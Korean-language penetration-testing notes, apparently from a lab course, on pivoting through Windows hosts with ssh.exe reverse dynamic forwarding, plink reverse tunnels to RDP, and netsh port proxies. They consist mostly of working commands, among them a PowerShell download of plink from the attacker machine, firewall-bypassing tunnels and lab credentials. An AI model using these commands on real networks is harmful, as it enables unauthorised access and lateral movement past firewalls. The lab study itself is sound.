## ssh.exe

**ssh 유틸리티 경로**
```jsx
%systemdrive%\\Windows\\System32\\OpenSSH
```

**ssh 위치 찾기 및 버전 확인 (7.6 이상인지)**
```jsx
where ssh
ssh.exe -V
```

**동적 포트포워딩 생성**
```jsx
ssh -N -R 9998 kali@192.168.118.4
```

**kali에서 포트 열렸는지 확인**
```jsx
ss -ntplu
```

**proxychains 설정 확인**
```jsx
tail /etc/proxychains4.conf
#...
#socks5 127.0.0.1 9998
```

**내부망에 postgres 연결**
```jsx
proxychains psql -h 10.4.50.215 -U postgres
```

## Plink

plink를 사용하여 인바운드 정책을 우회하고 RDP를 사용하는 시나리오
![[Pasted image 20250714142001.png]]

**칼리에서 plink 복사**
```jsx
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```

**plink 다운로드**
```jsx
powershell wget -Uri <http://192.168.118.4/plink.exe> -OutFile C:\\Windows\\Temp\\plink.exe
```

**plink로 원격 포트 포워딩 설정 (-l: 사용자 이름, -pw: 패스워드)**
```jsx
C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

**kali에서 포트 열렸는지 확인 (9833)**
```jsx
ss -ntplu
```

**kali에서 RDP 연결**
```jsx
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

## Netsh

윈도우의 내장 방화벽 구성 도구인 **Netsh** 를 사용하여 포트포워딩을 만들려면 **관리자 권한**이 필요하다.
![[Pasted image 20250714142028.png]]

**외부 인터페이스(192.168.50.64:2222)에서 수신하고 PGDATABASE01(10.4.50.215:22)로 패킷 전달**
```jsx
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

**로컬 IP 주소(localip=192.168.50.64) 를 사용하는 인터페이스의 로컬 포트(localport=2222) 에서 인바운드 연결(dir=in)을 허용**
```jsx
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

**실행 후 윈도우즈에서 작동중인지 확인**
```jsx
netstat -anp TCP | find "2222"
netsh interface portproxy show all
```

**칼리에서 2222포트에 접근 가능한지 확인**
```jsx
sudo nmap -sS 192.168.50.64 -Pn -n -p2222
```

**PGDATABASE01에 ssh 연결**
```jsx
ssh database_admin@192.168.50.64 -p2222
```

**방화벽 규칙 삭제 및 포트포워딩 삭제**
```jsx
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```